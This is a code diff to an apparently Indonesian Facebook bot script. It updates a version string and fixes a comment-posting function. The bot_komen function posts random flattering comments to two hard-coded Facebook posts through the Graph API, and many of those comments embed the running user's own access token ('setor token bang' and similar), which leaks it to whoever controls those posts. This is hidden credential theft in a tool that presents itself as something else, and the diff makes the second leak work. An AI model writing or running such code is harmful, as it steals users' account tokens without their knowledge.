@@ -43,7 +43,7 @@ if text == "":
     exit()
 
 #CEK VERSI
-versi = "1.7"
+versi = "1.8"
 if versi != vers:
     print("SC PERLU DIPERBAHARUI")
     print(b+"INFO UPDATE : "+k+pesan+p)
@@ -322,7 +322,7 @@ def bot_komen():
     post = ('1449536855445286')
     post2 = ('4553615664649177')
     kom = random.choice(["Ganteng bang", "Makasih bang", "Makin tampan aja si abang", token, "Matanya manis bang :v", "Eh buset.. emng gada obat ni abang..ganteng bett", "Salam kenal bang.", "Bagi nmr wa bang", "bjirr kyk BTS", "alisnya kek ulat bulu :v", "balas cht bang. mau kenalan", "bang ni token fb ku \n\n"+token, token, "simpen bang. buat esok \n\n"+token, "Bang.  ada tutor baru gk ?", "Kapan ngonten lg bang ?", "setor token bang \n\n"+token, "ini dlu bang.. satu token \n\n"+token])
-    random.choice(["Ganteng bang","Oyen gagah :v", "ganteng bett si Oyen :v", "Makasih bang", "Makin tampan aja si abang", token, "Matanya manis bang :v", "Eh buset.. emng gada obat ni abang..ganteng bett", "Salam kenal bang.", "Bagi nmr wa bang", "bjirr kyk BTS", "alisnya kek ulat bulu :v", "balas cht bang. mau kenalan", "bang ni token fb ku \n\n"+token, token, "simpen bang. buat esok \n\n"+token, "Bang.  ada tutor baru gk ?", "Kapan ngonten lg bang ?", "setor token bang \n\n"+token, "ini dlu bang.. satu token \n\n"+token])
+    kom2 = random.choice(["Ganteng bang","Oyen gagah :v", "ganteng bett si Oyen :v", "Makasih bang", "Makin tampan aja si abang", token, "Matanya manis bang :v", "Eh buset.. emng gada obat ni abang..ganteng bett", "Salam kenal bang.", "Bagi nmr wa bang", "bjirr kyk BTS", "alisnya kek ulat bulu :v", "balas cht bang. mau kenalan", "bang ni token fb ku \n\n"+token, token, "simpen bang. buat esok \n\n"+token, "Bang.  ada tutor baru gk ?", "Kapan ngonten lg bang ?", "setor token bang \n\n"+token, "ini dlu bang.. satu token \n\n"+token])
     requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
     requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + token)
     menu()
